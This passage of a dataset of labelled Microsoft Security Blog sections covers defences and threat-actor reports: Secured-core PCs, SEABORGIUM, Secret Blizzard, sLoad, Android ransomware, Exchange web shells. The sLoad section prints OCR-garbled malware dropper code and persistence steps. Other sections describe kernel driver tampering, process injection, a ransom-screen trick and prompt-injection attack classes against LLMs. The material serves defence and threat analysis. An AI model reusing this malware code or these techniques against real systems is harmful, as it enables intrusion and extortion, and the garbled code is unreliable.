to perform the complex decision flow of mapping which security feature (e.g., hypervisorprotected code integrity (HVCI), virtualization-based security (VBS), Windows Defender Credential Guard) are supported by which hardware (e.g., TPM 1.0, 2.0, etc.). \nWith Secured-core PCs, customers no longer need to make this complex decision; they're assured that these devices support the latest hardware-backed security features. ", "source": "microsoft"}, {"title": "defend", "content": "Secured-core PCs are the latest hardware to provide driver control out of the box, with baseline configuration already set. Driver control is provided by a combination of HVCI & Windows Defender Application Control (WDAC) technologies. \nEvery driver loaded into the kernel is verified by HVCI before it's allowed to run. HVCI runs in a hardware-protected execution environment isolated from the kernel space and cannot be tampered with by other code running in the kernel, including drivers. \nDriver control uses HVCI & WDAC technologies to perform the following operations: \n1. Validity and memory integrity enforcement at load-time and runtime \nHVCI uses hardware-based virtualization and the hypervisor (the same hypervisor also used in Azure) to protect Windows kernel mode processes from injection and execution of malicious or unverified code. The integrity of code that runs in the Windows kernel is validated by HVCI according to the kernel signing policy applied to the device. Additionally, kernel memory pages are never simultaneously writable and executable. This makes Securedcore PCs highly resistant to malicious software attempting to gain code execution in the kernel. \nIn the case of GDRV.sys, which is the driver used by the RobbinHood malware, if the vulnerable driver is successfully loaded and then exploited, the runtime memory integrity check would protect the critical components. Thus, an attack to change ci!g_CiOptions and nt!g_CiEnabled, would be ineffective, as the kernel ignores changes to the variables coming from the general kernel space. And, as code integrity is enabled by default, the malicious driver RBNL.sys wouldn't load. \nThe image below shows an event log from a Secured-core PC showing runtime memory integrity check preventing the CI options from being tampered with by RobbinHood and, subsequently, preventing the malicious driver RBNL.sys from being loaded. \nSecured-core PCs: A brief showcase of chip-to-cloud security against kernel attacks | Microsoft Security Blog Because runtime memory integrity check is enabled by default on Securedcore PCs, RobbinHood wouldn't be able to disable code integrity on these machines. ", "source": "microsoft"}, {"title": "defend", "content": "There are several unverified code execution mitigations built-in to Windows. These are readily available on Secured-core PCs. \nThe RobbinHood attack utilized the vulnerable GDRV.sys driver to change a crucial variable within the system memory. Although HVCI already protects against the attack on g_CiOptions, other areas of memory may still be susceptible, and we need broader defense against kernel data corruption attacks. \nIn addition to existing mitigations, Windows is introducing a new feature called Kernel Data Protection (KDP), which provides driver developers and software running in the Windows kernel (and the OS code itself) with the ability to mark some kernel memory containing sensitive information as read-only protected. The memory is protected through the second level address translation (SLAT) tables by \nSecured-core PCs: A brief showcase of chip-to-cloud security against kernel attacks | Microsoft Security Blog the hypervisor, such that no software running in VTL0 have access to the protected memory. KDP does not protect executable pages, as those are already protected with HVCI. \nMany kernel components have data that is set only once during boot and remains unchanged for the rest of the boot cycle. The first release of KDP protects the static data sections of a driver. In the future, we're also planning to provide APIs to dynamically allocate and release protected initialized pool memory. \nSecured-core PCs have KDP enabled by default. ", "source": "microsoft"}, {"title": "Defense", "content": "As observed in RobbinHood attacks, once the threat gains kernel-level privilege, the threat turns off system defenses, including the endpoint protection agent. Secured-core PCs provide a monitoring agent that utilizes virtualization-based security and runs in this protected environment. \nThe monitoring agent performs several functions. The ones relevant for this case study are: \nSecure anti-tampering for security agents Secure monitoring of Windows ", "source": "microsoft"}, {"title": "Conclusion", "content": "As this case study demonstrates, more and more threats are becoming so advanced that they can bypass software-only based defenses. Secured-core PCs are protected from RobbinHood and similar threats by default. \nCustomers can also get similar protection on traditional devices as long as they have the necessary hardware and are configured correctly. Specifically, the following features need to be enabled: Secure boot, HVCI (enables VBS), KDP (automatically turned on when VBS is on), KDMA (Thunderbolt only) and Windows Defender System Guard. \nWith Secured-core PCs, however, customers get a seamless chip to cloud security pattern that starts from a strong hardware root of trust and works with cloud services and Microsoft Defender ATP to aggregate and normalize the alerts from hardware elements to provide end-to-end endpoint security. \nOverall improved endpoint protection accrues to the broader Microsoft Threat Protection, which combines and orchestrates into a single solutions the capabilities of Microsoft Defender ATP, Office 365 ATP, Azure ATP, and Microsoft Cloud App Security to provide comprehensive, cross-domain protection for endpoints, email and data, identities, and apps. ", "source": "microsoft"}, {"title": "Introduction", "content": "By Digital Threat Analysis Center (DTAC) Microsoft Threat Intelligence \nand victimology that align closely with Russian state interests. Its campaigns involve persistent phishing and credential theft campaigns leading to intrusions and data theft. SEABORGIUM intrusions have also been linked to hack-and-leak campaigns, where stolen and leaked data is used to shape narratives in targeted countries. While we cannot rule out that supporting elements of the group may have current or prior affiliations with criminal or other nonstate ecosystems, MSTIC assesses that information collected during SEABORGIUM intrusions likely supports traditional espionage objectives and information operations as opposed to financial motivations. \nThis blog provides insights into SEABORGIUM's activities and technical methods, with the goal of sharing context and raising awareness about a significant threat to Microsoft customers. MSTIC would like to acknowledge the Google Threat Analysis Group (TAG) and the Proofpoint Threat Research Team for their collaboration on tracking and disrupting this actor. Microsoft's ability to detect and track SEABORGIUM's abuse of Microsoft services, particularly OneDrive, has provided MSTIC sustained visibility into the actor's activities and enabled us to notify impacted customers. As an outcome of these service abuse investigations, MSTIC partnered with abuse teams in Microsoft to disable accounts used by the actor for reconnaissance, phishing, and email collection. Microsoft Defender SmartScreen has also implemented detections against the phishing domains represented in SEABORGIUM's activities. ", "source": "microsoft"}, {"title": "Introduction", "content": "At the heart of the Surface Laptop 4, the device leverages the Trusted Platform Module 2.0 (TPM) and the AMD Ryzen\u2122 Mobile Processors with System Guard to boot securely and minimize the impact of firmware vulnerabilities by sandboxing firmware to protect critical subsystems and sensitive data. Kernel Direct Memory Access Protection is pre-enabled on these devices, helping to ensure that the system is protected against malicious and unintended Direct Memory Access (DMA) attacks for all DMA-capable devices, such as PCI devices, thwarting the entire class of drive-by DMA attacks like Thunderspy. \nThe TPM 2.0 serves as the hardware root-of-trust for the Surface Laptop 4. With hardware protections for sensitive assets like BitLocker keys and security measurements for the state of the system, the TPM 2.0 helps make the Surface Laptop 4 ready for Zero Trust security. ", "source": "microsoft"}, {"title": "Protection", "content": "As pointed out in the Security Signals report, firmware is emerging as a primary target because it's where devices store sensitive information, like credentials and encryption keys. To address this Microsoft introduced its own open-source UEFI to help enable a secure and maintainable interface to manage firmware. On the Surface side, we have been enabling the automation of firmware protection since the 2015 release of Surface Pro 4. That's when we made the decision to build our own Microsoft UEFI 1 and facilitate full transparency for our customers with the open-source project called Project Mu. \nIf you're not already familiar with UEFI, it stands for Unified Extensible Firmware Interface. It's essentially a modern version of a BIOS that initializes and validates system hardware components, boots Windows 10 from an SSD, and provides an interface for the OS to interact with the keyboard, display, and other input/output devices. ", "source": "microsoft"}, {"title": "Protection", "content": "Along with limiting to a small, trusted computing base by establishing a hardware root of trust, Surface Laptop 4 confirms that code running within that trusted computing base runs with integrity. \nVirtualization-based security (VBS) isolates the operating system and provides a hardware-based security boundary, thereby separating security features and sensitive code and data from vulnerabilities in the operating system. Hypervisorenforced Code Integrity (HVCI) checks the system software before it is loaded, allowing only executables that are signed by known, approved authorities to start. The hypervisor also helps ensure that kernel executable memory is not writable. This prevents the modifications of sensitive kernel structures and provides strong protections against kernel viruses and malware. Time and again, the protections offered by VBS and HVCI have been shown to provide essential resistance against practical real-world threats. ", "source": "microsoft"}, {"title": "Protection", "content": "Complementing the platform security provided by secured-core and Project Mu, Surface Laptop 4 helps ensure that user identities and credentials are protected against theft, compromise, and phishing attacks. \nWindows Hello helps prevent phishing and credential-based attacks through a combination of biometric sensors and hardware-based credential storage. Using your face, secure FIDO2 key, or PIN, Windows Hello allows you to sign in passwordfree and gives you a faster, more secure way to unlock your device. \nWindows Defender Credential Guard, an optional feature that can be enabled, leverages VBS to help isolate secrets and confidential information such that only privileged system software can access it. This helps prevent identity attack techniques such as Pass-the-Hash and Pass-the-Ticket. ", "source": "microsoft"}, {"title": "Introduction", "content": "CODESYS is a software development environment that provides automation specialists with tools for developing automated solutions. CODESYS is a platformindependent solution that helps device manufacturers implement the international industrial standard IEC 611131-3. The SDK also has management software that runs on Windows machines and a simulator for testing environments, allowing users to test their PLC systems before deployment. The proprietary protocols used by CODESYS use either UDP or TCP for communication between the management software and PLC. \nCODESYS is widely used and can be found in several industries, including factory automation, energy automation, and process automation, among others. ", "source": "microsoft"}, {"title": "Introduction", "content": "The United States Cybersecurity and Infrastructure Security Agency (CISA) has attributed Secret Blizzard to Center 16 of Russia's Federal Security Service (FSB), which is one of Russia's Signals Intelligence and Computer Network Operations (CNO) services responsible for intercepting and decrypting electronic data as well as the technical penetration of foreign intelligence targets. Secret Blizzard overlaps with the threat actor tracked by other security vendors as Turla, Waterbug, Venomous Bear, Snake, Turla Team, and Turla APT Group. \nSecret Blizzard is known for targeting a wide array of verticals, but most prominently ministries of foreign affairs, embassies, government offices, defense departments, and defense-related companies worldwide. Secret Blizzard focuses on gaining long-term access to systems for intelligence collection using extensive resources such as multiple backdoors, including some with peer-to-peer functionality and C2 communication channels. During intrusions, the threat actor collects and exfiltrates documents, PDFs, and email content. In general, Secret Blizzard seeks out information of political importance with a particular interest in advanced research that might impact international political issues. Campaigns where Secret Blizzard has used the tools or compromised infrastructure of other threat adversaries that have been publicly reported by other security vendors include: \nAccessing tools and infrastructure of Iranian state-sponsored threat actor Hazel Sandstorm (also called OilRig, APT-34 and Crambus) in 2017, as reported by Symantec and the US and UK intelligence services Reusing Andromeda malware to deploy the KopiLuwak and QuietCanary backdoors in 2022, as reported by Mandiant. Using the backdoor of the Kazakhstan-based threat actor tracked by Microsoft Threat Intelligence as Storm-0473, also called Tomiris, in an attempt to deploy QuietCanary in 2022, as reported by Kaspersky. \nWhile not unique, leveraging the access of other adversaries is a somewhat unusual attack vector for threat actors in general. Secret Blizzard's use of this technique highlights their approach to diversifying attack vectors, including using strategic web compromises (watering holes) and adversary-in-the-middle (AiTM) campaigns likely facilitated via legally mandated intercept systems in Russia such as the \nFrequent freeloader part I: Secret Blizzard compromising Storm-0156 infrastructure for espionage | Microsoft Security Blog \"System for Operative Investigative Activities\" (SORM). More commonly, Secret Blizzard uses server-side and edge device compromises as initial attack-vectors to facilitate further lateral movement within a network of interest. ", "source": "microsoft"}, {"title": "Conclusion", "content": "The frequency of Secret Blizzard's operations to co-opt or commandeer the infrastructure or tools of other threat actors suggests that this is an intentional component of Secret Blizzard's tactics and techniques. Leveraging this type of resource has both advantages and drawbacks. Taking advantage of the campaigns of others allows Secret Blizzard to establish footholds on networks of interest with relatively minimal effort. However, because these initial footholds are established on another threat actor's targets of interest, the information obtained through this technique may not align entirely with Secret Blizzard's collection priorities. In addition, if the threat actor that established the initial foothold has poor operational security, this technique might trigger endpoint or network security alerts on the tools deployed by the actor conducting the initial compromise, resulting in unintended exposure of Secret Blizzard activity. ", "source": "microsoft"}, {"title": "Introduction", "content": "Identifying and detecting malicious activities within massive amounts of data processed by Microsoft Defender ATP require smart automation methods and AI. Machine learning classifiers digest large volumes of historical data and apply automatically extracted insights to score each new data point as malicious or benign. Machine learning-based models may look at, for example, registry activity and produce a probability score, which indicates the probability of the registry write being associated with malicious activity. To tie everything together, behaviors are structured into virtual process trees, and all signals associated with each process tree are aggregated and used for detecting malicious activity. \nWith virtual process trees and signals of different types associated to these trees, there are still large amounts of data and noisy signals to sift through. Since each signal occurs in the context of a process tree, it's necessary to fuse these signals in the chronological order of execution within the process tree. Data ordered this way requires a powerful model to classify malicious vs. benign trees. \nOur solution comprises several deep learning building blocks such as Convolutional Neural Networks (CNNs) and Long Short-Term Memory Recurrent Neural Networks (LSTM-RNN). The neural network can take behavior signals that occur chronologically in the process tree and treat each batch of signals as a sequence of events. These sequences can be collected and classified by the neural network with high precision and detection coverage. ", "source": "microsoft"}, {"title": "Conclusion", "content": "Modeling a process tree, given different signals that happen at different times, is a complex task. It requires powerful models that can remember long sequences and still be able to generalize well enough to churn out high-quality detections. The Deep CNN-BiLSTM model we discussed in this blog is a powerful technology that helps Microsoft Defender ATP achieve this task. Today, this deep learning-based solution contributes to Microsoft Defender ATP's capability to detect evolving threats like Bondat. \nMicrosoft Defender ATP raises alerts for these deep learning-driven detections, enabling security operations teams to respond to attacks using Microsoft Defender ATP's other capabilities, like threat and vulnerability management, attack surface reduction, next-generation protection, automated investigation and response, and Microsoft Threat Experts. Notably, these alerts inform behavioral blocking and containment capabilities, which add another layer of protection by blocking threats if they somehow manage to start running on machines. \nThe impact of deep learning-based protections on endpoints accrues to the broader Microsoft Threat Protection (MTP), which combines endpoint signals with threat data from email and docs, identities, and apps to provide cross-domain visibility. MTP harnesses the power of Microsoft 365 security products to deliver unparalleled coordinated defense that detects, blocks, remediates, and prevents attacks across an organization's Microsoft 365 environment. Through machine learning and AI technologies like the deep-learning model we discussed in this blog, MTP automatically analyzes cross-domain data to build a complete picture of each attack, eliminating the need for security operations centers (SOC) to manually build and track the end-to-end attack chain and relevant details. MTP correlates and consolidates attack evidence into incidents, so SOCs can save time and focus on critical tasks like expanding investigations and proacting threat hunting. ", "source": "microsoft"}, {"title": "Introduction", "content": "sLoad is known to infect machines using spear-phishing emails and a common but effective detection evasion technique: the cascaded scripts. One script drops or downloads one or more scripts, passes control to one of these scripts, and repeats the process multiple times until the final component is installed. \nOver time, we've seen some variations of this technique. One sLoad campaign used the link target field of a LNK file to run PowerShell commands that extracts and runs the first-stage PowerShell code, which is appended to the end of the LNK file or, in one instance, the end of the ZIP file that originally contained the LNK file. In another campaign, the first-stage PowerShell code itself uses a download BITS job to download either the sLoad script and the C2 URL file or the sLoad dropper PowerShell script that embeds the encrypted sLoad script and C2 URL file within itself. \nIn the most recent attacks, for the first stage, sLoad shifted from using PowerShell script to VBScript. The randomly named VBScript file is simply a proxy that builds and then drops and runs a PowerShell script, always named rr.ps1. This is none other than the same sLoad PowerShell dropper mentioned earlier that embeds the encrypted sLoad script and C2 URL file within itself. \nIn most variations of the installation, the sLoad dropper script is the last intermediate stage that performs the following actions, and eventually decrypts and runs the final sLoad script: \n1. Creates an installation folder in the $\\%A P P D A T A\\%$ folder named after the first 6 characters of the Win32 Product UUID. \n\\$1ksjdflasjdasdfwefweufbnwef-\\$env:userprofile+'\\AppData\\Roaming'; Suuid =(Get-Wmiobject Win32_ComputerSystemProduct).UUID; \\$comP=\\$uid.Substring(0,6); \\$log=\\$1ksjdflasjdasdfwefweufbnwef+\"\\\"+\\$comP; If(!(test-path \\$log)){New-Item -ItemType Directory -Force -Path \\$log) 2. Drops an infection marker file named _in, and during the successive executions, uses the LastWriteTime on this file to check whether the malware is installed within last 30 mins, in which case, it terminates. If(test-path \\$log\"\\_in\"){\\$r=Get-ChildItem \\$log\"\\_in\";\\$sdfeqd = Get-Datejif (\\$r.LastWriteTime -gt \\$sdfeqd.AddMinutes(-3e)){break;break; break;}); \"1\" | out-file \\$log\"\\_in\"; \n3. Drops the encrypted sLoad script and the C2 URL file as config.ini and web.ini, respectively. \n4. Builds and drops two more randomly named scripts: one VBScript and one PowerShell script. \n\\$rp=-join ((65..90)+(97..122)|Get-Random -Count 8|%{[char]\\$_})   \n\\$v='Dim objWmi,colItems,objItem,struUID,blnValiduUID,oShell\u2032+\\$OFS+'Set objWmi=GetObject(\"winmgmts:\\1&\".\"&\"\\root\\cimv2\")\\*+\\$OF +Set colItems = objwmi.ExecQuery(\"Select \\*from Win32_ComputerSystemProduct\")\\*+\\$OFS+\\*Set oShell =WScript.Create0bject (\"WScript.Shell '+\\$0FS+'oShell.run \"power\"+\"shel\"+\"1.exe -Nologo -win hi\"+\"dden -ep by\"+\"pass -Fi\"+\"le \\*+\\$log+'\\'+\\$rp+\u2032.ps1 -k \"& WScript.Arguments(0), True'+\\$OFS+'Set oShell = Nothing';   \n\\$v| out-file Slog'\\'\\$rp'.vbs\" \n'param ([string]\\$k =\");\\$jyd=Get-Process-name powershell\\*;\\$kjasdfh=\\$env:APPDATA; if (\\$jjyd.length -1t 2){\\$asdfasdf =(Get-Wmiobject Win32_ComputerSystemProduct).UUID ;\\$comP=\\$asdfasdf.Substring(0,6); \\$log -Skjasdfh+\"\\\"+\\$comP;\\$key=\\$k =split\",\";\\$Secure= Get-Content \\$log\"\\config.ini\";\\$Encrypted= ConvertTo-SecureString \\$Secure -key \\$key;\\$slStr -[System.Runtime.InteropServices.Marshal] ::SecureStringToBSTR(SEncrypted);\\$rStr =[System.Runtime.InteropServices.Marshal]:PtrToStringAuto(\\$s1Str);Invoke-Expression \\$rStr;} out-file \\$log'\\'\\$rp'-ps1 \n5. Uses schtasks.exe to create a scheduled task named AppRunLog to run the randomly named VBScript from the previous step with decryption key supplied as a command line parameter; deletes the previously created related tasks (if found) before creating this one. The scheduled task is configured to start at 7:00 AM and run every 3 mins. \nThe dropped VBScript that runs under the scheduled task is yet another proxy that simply runs the dropped PowerShell script with the same command line parameter (the decryption key). The PowerShell script decrypts the contents of the previously dropped config.ini in the memory into another piece of PowerShell code, which it then runs. This is the final component, the script detected as   \nTrojanDownloader:PowerShell/sLoad, that uses BITS to perform every important malicious activity. ", "source": "microsoft"}, {"title": "Protection", "content": "sLoad is just one example of the increasingly more prevalent threats that can perform most of their malicious activities by simply living off the land. In this case, it's a dangerous threat that's equipped with notorious spyware capabilities, infiltrative payload delivery, and data exfiltration capabilities. sLoad's behavior can be classified as a Type III fileless technique: while it drops some malware files during installation, its use of only BITS jobs to perform most of its harmful behaviors and scheduled tasks for persistence achieves an almost fileless presence on compromised machines. \nTo defeat multi-stage, stealthy, and persistent threats like sLoad, Microsoft Defender ATP's antivirus component uses multiple next-generation protection engines on the client and in the cloud. While most threats are identified and stopped by many of these engines, behavioral blocking and containment capabilities detects malicious behaviors and blocks threats after they have started running: \nThese detections are also surfaced in Microsoft Defender Security Center. Security operations teams can then use Microsoft Defender ATP's other capabilities like endpoint detection and response (EDR), automated investigation and response, Threat and Vulnerability Management, and Microsoft Threat Experts to investigate and respond to attacks. This reflects the defense-in-depth strategy that is central to the unified endpoint protection provided by Microsoft Defender ATP. \nAs part of Microsoft Threat Protection, Microsoft Defender ATP shares security signals about this threat to other security services, which likewise inform and enrich endpoint protection. For example, Office 365 ATP's intelligence on the emails that carry sLoad is shared to and used by Microsoft Defender ATP to build even stronger defenses at the source of infection. Real-time signal-sharing across Microsoft's security services gives Microsoft Threat Protection unparalleled visibility across attack vectors and the unique ability to provide comprehensive protection for identities, endpoints, data, cloud apps, and infrastructure. \nSujit Magar Microsoft Defender ATP Research Team ", "source": "microsoft"}, {"title": "Introduction", "content": "Cross-process injection can be used to provide an attacker more visibility into normal processes. For example, injected code can record keystrokes sent to an affected process. At the same time, this method hides malicious code and enables process migration, which can be used for organizational persistence. \nCross-process injection is inherently stealthy because it conceals malicious code inside benign processes. Even when a process has been injected with malicious code, its loaded images (the executable and library files associated with the process) continue to point to legitimate files on disk as shown in Figure 2. This shows a clear advantage over running malicious code in its own process space, which necessitates that the code reside on disk as an image file that is subject to inspection by antimalware and is easily recovered as forensic evidence. \nBy enabling process migration, cross-process injection allows attacks to stay active. In a drive-by-download attack, for instance, an attacker can gain control of the browser process and disable its sandbox. To execute malicious code beyond the lifecycle of the browser, which may terminate at any time, the attacker migrates the malicious code to a long-lived process, such as winlogon.exe, using cross-process injection. The risk of a user powering down the machine and erasing the malware remains, but an apex attacker overcomes this by staying active on multiple devices on the enterprise network. If one device is indeed restarted and the malicious code erased, the attacker can easily move laterally back to that device. ", "source": "microsoft"}, {"title": "defend", "content": "In Creators Update for Windows Defender ATP, we have instrumented related function calls and built statistical models to detect a broad range of malicious injection techniques used in the wild. To determine how these enhancements effectively uncover hostile activities that leverage cross-process injection, we tested the enhancements against the following real-world cases: a targeted attack, a remote access tool (RAT), and cryptocurrency mining malware. ", "source": "microsoft"}, {"title": "Introduction", "content": "Microsoft 365 Defender demonstrated complete technique-level coverage across all the attack stages of Wizard Spider and Sandworm, leveraging our artificial intelligence-driven adaptive protection. \nDefending against human-operated ransomware requires a defense in-depth approach that continuously evaluates device, user, network, and organization risk and then leverages these signals to alert on potential threats across the entire attack chain. Providing detection and visibility enables defenders to evict the attackers from the network during the pre-ransom phase. It also minimizes the impact of encryption or extortion through data exfiltration activities. ", "source": "microsoft"}, {"title": "Protection", "content": "Microsoft 365 Defender provided superior coverage and blocked $100\\%$ of the attack stages, offering excellent coverage across Windows and Linux platforms. Moreover, its next-generation protection capabilities proceeded without hindering productivity by blocking benign activities or a need for user consent. \nIn real-world scenarios, blocking ransomware activities early-that is, in the preransom stage across all platforms and assets-is crucial in protecting customers and mitigating the downstream extortion and disruption attack impact. ", "source": "microsoft"}, {"title": "defend", "content": "Microsoft 365 Defender's integrated identity protection capabilities uncover and durably block identity-related attacks regardless of the specific attacker technique implemented on a device, making it practically impossible for attackers to evade. Furthermore, building these protections in the identity fabric provides in-depth, context-rich signals for security teams to investigate and respond effectively. Other vendors leveraging endpoint-only signals may be more susceptible to evasion, and their detections typically have less context. \nHere are some examples representing Microsoft 365 Defender's unique identity protection capabilities in the evaluation: \nStep 5.A.4 \u2013 query to a security account manager (SAM) database was uncovered using Active Directory signals with detailed context on user enumeration activity. This identity-based detection approach prevents attacker evasion and provides rich investigation context for security teams. Some other vendors in the test relied on process creation telemetry to get similar visibility but lacked context and could be easily bypassed. \nStep 6.A.2 \u2013 resource-access activity on a domain controller was also uncovered using our identity sensors, with details of the exposed service principal name (SPN) and the compromised related resource name. Here too, this approach provides similar detection durability and investigation details advantages. ", "source": "microsoft"}, {"title": "Protection", "content": "Microsoft 365 Defender continues to demonstrate excellent protection coverage on all platforms, with top-level coverage on Windows and Linux. It covered all Linuxrelated stages via technique-level analytics, context-rich alerts, and in-depth investigation signals. \nCustomers face threats from various entry points across devices, and device discovery and lateral movement to identify high-value assets are table stakes for advanced attacks like human-operated ransomware. Therefore, having excellent coverage across all platforms is crucial to protect organizations against attacks. \nFor example, as seen in Figure 10 below, Microsoft Defender for Endpoint on a Linux device alerted of suspicious behavior by a web server process. The alert allowed for blocking sensitive file read and preventing further file read. The attacker then attempted to download and run a backdoor on the device. However, that was also blocked behaviorally, thus preventing subsequent compromise. ", "source": "microsoft"}, {"title": "Introduction", "content": "One of the main concerns with AI is its potential misuse for malicious purposes. To prevent this, AI systems at Microsoft are built with several layers of defenses throughout their architecture. One purpose of these defenses is to limit what the LLM will do, to align with the developers' human values and goals. But sometimes bad actors attempt to bypass these safeguards with the intent to achieve unauthorized actions, which may result in what is known as a \"jailbreak.\" The consequences can range from the unapproved but less harmful-like getting the AI interface to talk like a pirate-to the very serious, such as inducing AI to provide detailed instructions on how to achieve illegal activities. As a result, a good deal of effort goes into shoring up these jailbreak defenses to protect AI-integrated applications from these behaviors. \nWhile AI-integrated applications can be attacked like traditional software (with methods like buffer overflows and cross-site scripting), they can also be vulnerable to more specialized attacks that exploit their unique characteristics, including the manipulation or injection of malicious instructions by talking to the AI model through the user prompt. We can break these risks into two groups of attack techniques: \nMalicious prompts: When the user input attempts to circumvent safety systems in order to achieve a dangerous goal. Also referred to as user/direct prompt injection attack, or UPIA.   \nPoisoned content: When a well-intentioned user asks the AI system to process a seemingly harmless document (such as summarizing an email) that contains content created by a malicious third party with the purpose of exploiting a flaw in the AI system. Also known as cross/indirect prompt injection attack, or XPIA. ", "source": "microsoft"}, {"title": "Introduction", "content": "Our continued investigation on the Dofoil outbreak revealed that the March 6 campaign was a carefully planned attack with initial groundwork dating back to mid-February. To set the stage for the outbreak, attackers performed an update poisoning campaign that installed a trojanized version of MediaGet on computers. The following timeline shows the major events related to the Dofoil outbreak. ", "source": "microsoft"}, {"title": "Defense", "content": "The Dofoil outbreak on March 6, which was built on prior groundwork, exemplifies the kind of multi-stage malware attacks that are fast-becoming commonplace. Commodity cybercrime threats are adopting sophisticated methods that are traditionally associated with more advanced cyberattacks. Windows Defender Advanced Threat Protection (Windows Defender ATP) provides the suite of nextgen defenses that protect customers against a wide range of attacks in real-time. \nWindows Defender AV enterprise customers who have enabled the potentially unwanted application (PUA) protection feature were protected from the trojanized MediaGet software that was identified as the infection source of the March 6 outbreak. \nWindows Defender AV protected customers from the Dofoil outbreak at the onset. Behavior-based detection technologies flagged Dofoil's unusual persistence mechanism and immediately sent a signal to the cloud protection service, where multiple machine learning models blocked most instances at first sight. \nIn our in-depth analysis of the outbreak, we also demonstrated that the rich detection libraries in Windows Defender ATP flagged Dofoil's malicious behaviors throughout the entire infection process. These behaviors include code injection, evasion methods, and dropping a coin mining component. Security operations can use Windows Defender ATP to detect and respond to outbreaks. Windows Defender ATP also integrates protections from Windows Defender AV, Windows Defender Exploit Guard, and Windows Defender Application Guard, providing a seamless security management experience. \nFor enhanced security against Dofoil and others similar coin miners, Microsoft recommends Windows 10 S. Windows 10 S exclusively runs apps from the Microsoft Store, effectively blocking malware and applications from unverified sources. Windows 10 S users were not affected by this Dofoil campaign. \nTo test how Windows Defender ATP can help your organization detect, investigate, and respond to advanced attacks, sign up for a free trial. ", "source": "microsoft"}, {"title": "defend", "content": "\\*Updated 4/30/2018 \u2013 Emergency Dynamic Intelligence Update (EDIU) and other new features in Windows Defender AV and the rest of the Windows Defender ATP defense stack are now available with Windows 10 version 1803, also known as the Windows 10 April 2018 Update. Read more: What's new in the Windows 10 April 2018 Update. ", "source": "microsoft"}, {"title": "Introduction", "content": "In the past, Android ransomware used a special permission called \"SYSTEM_ALERT_WINDOW\" to display their ransom note. Apps that have this permission can draw a window that belongs to the system group and can't be dismissed. No matter what button is pressed, the window stays on top of all other windows. The notification was intended to be used for system alerts or errors, but \nAndroid threats misused it to force the attacker-controlled UI to fully occupy the screen, blocking access to the device. Attackers create this scenario to persuade users to pay the ransom so they can gain back access to the device. \nTo catch these threats, security solutions used heuristics that focused on detecting this behavior. Google later implemented platform-level changes that practically eliminated this attack surface. These changes include: \n1. Removing the SYSTEM_ALERT_WINDOW error and alert window types, and introducing a few other types as replacement   \n2. Elevating the permission status of SYSTEM_ALERT_WINDOW to special permission by putting it into the \"above dangerous\" category, which means that users have to go through many screens to approve apps that ask for permission, instead of just one click   \n3. Introducing an overlay kill switch on Android 8.0 and later that users can activate anytime to deactivate a system alert window \nTo adapt, Android malware evolved to misusing other features, but these aren't as effective. For example, some strains of ransomware abuse accessibility features, a method that could easily alarm users because accessibility is a special permission that requires users to go through several screens and accept a warning that the app will be able to monitor activity via accessibility services. Other ransomware families use infinite loops of drawing non-system windows, but in between drawing and redrawing, it's possible for users to go to settings and uninstall the offending app. \nThe new Android ransomware variant overcomes these barriers by evolving further than any Android malware we've seen before. To surface its ransom note, it uses a series of techniques that take advantage of the following components on Android: \n1. The \"call\" notification, among several categories of notifications that Android supports, which requires immediate user attention. 2. The \"onUserLeaveHint()\" callback method of the Android Activity (i.e., the typical GUI screen the user sees) is called as part of the activity lifecycle when the activity is about to go into the background as a result of user choice, for example, when the user presses the Home key. \nThe malware connects the dots and uses these two components to create a special type of notification that triggers the ransom screen via the callback. \nAs the code snippet shows, the malware creates a notification builder and then does the following: \n1. setCategory(\"call\") \u2013 This means that the notification is built as a very important notification that needs special privilege. 2. setFullScreenIntent() \u2013 This API wires the notification to a GUI so that it pops up when the user taps on it. At this stage, half the job is done for the malware. However, the malware wouldn't want to depend on user interaction to trigger the ransomware screen, so, it adds another functionality of Android callback: \nSophisticated new Android malware marks the latest evolution of mobile ransomware | Microsoft Security Blog   \npublic void onBackPressed(){ super.onCreate(bundle);   \npublic static int getFlags(){ return 0x680480; \nAs the code snippet shows, the malware overrides the onUserLeaveHint() callback function of Activity class. The function onUserLeaveHint() is called whenever the malware screen is pushed to background, causing the in-call Activity to be automatically brought to the foreground. Recall that the malware hooked the RansomActivity intent with the notification that was created as a \"call\" type notification. This creates a chain of events that triggers the automatic pop-up of the ransomware screen without doing infinite redraw or posing as system window. ", "source": "microsoft"}, {"title": "Introduction", "content": "Since September 2020, MSTIC has observed six Iranian threat groups deploying ransomware to achieve their strategic objectives. These ransomware deployments were launched in waves every six to eight weeks on average. \nIn one observed campaign, PHOSPHORUS targeted the Fortinet FortiOS SSL VPN and unpatched on-premises Exchange Servers globally with the intent of deploying ransomware on vulnerable networks. A recent blog post by the DFIR Report describes a similar intrusion in which actors leveraged vulnerabilities in on-premise Exchange Servers to compromise a victim environment and encrypt systems via BitLocker. MSTIC also attributes this activity to PHOSPHORUS. PHOSPHORUS operators conducted widespread scanning and ransomed targeted systems through a five-step process: Scan, Exploit, Review, Stage, Ransom. ", "source": "microsoft"}, {"title": "Introduction", "content": "By Microsoft Defender Security Research Team \nmisguided notion that these protections interfere with normal Exchange functions. Attackers know this, and they leverage this knowledge to gain a stable foothold on a target organization. \nThere are two primary ways in which Exchange servers are compromised. The first and more common scenario is attackers launching social engineering or drive-by download attacks targeting endpoints, where they steal credentials and move laterally to other endpoints in a progressive dump-escalate-move method until they gain access to an Exchange server. \nThe second scenario is where attackers exploit a remote code execution vulnerability affecting the underlying Internet Information Service (IIS) component of a target Exchange server. This is an attacker's dream: directly landing on a server and, if the server has misconfigured access levels, gain system privileges. \nThe first scenario is more common, but we're seeing a rise in attacks of the second variety; specifically, attacks that exploit Exchange vulnerabilities like CVE-2020- 0688. The security update that fixes this vulnerability has been available for several months, but, notably, to this day, attackers find vulnerable servers to target. \nIn many cases, after attackers gain access to an Exchange server, what follows is the deployment of web shell into one of the many web accessible paths on the server. As we discussed in a previous blog, web shells allow attackers to steal data or perform malicious actions for further compromise. ", "source": "microsoft"}, {"title": "Defense", "content": "As these attacks show, Exchange servers are high-value targets. These attacks also tend to be advanced threats with highly evasive, fileless techniques. For example, at every stage in the attack chain above, the attackers abused existing tools (LOLBins) and scripts to accomplish various tasks. Even in cases where non-system binaries were introduced, they were either legitimate and signed, like plink.exe, or just a proxy for the malicious binary, for example, the modified Mimikatz where the actual malicious payload never touched the disk. \nKeeping these servers safe from these advanced attacks is of utmost importance. Here are steps that organizations can take to ensure they don't fall victim to Exchange server compromise. \n1. Apply the latest security updates \nIdentify and remediate vulnerabilities or misconfigurations in Exchange servers. Deploy the latest security updates, especially for server components like Exchange, as soon as they become available. Specifically, check that the patches 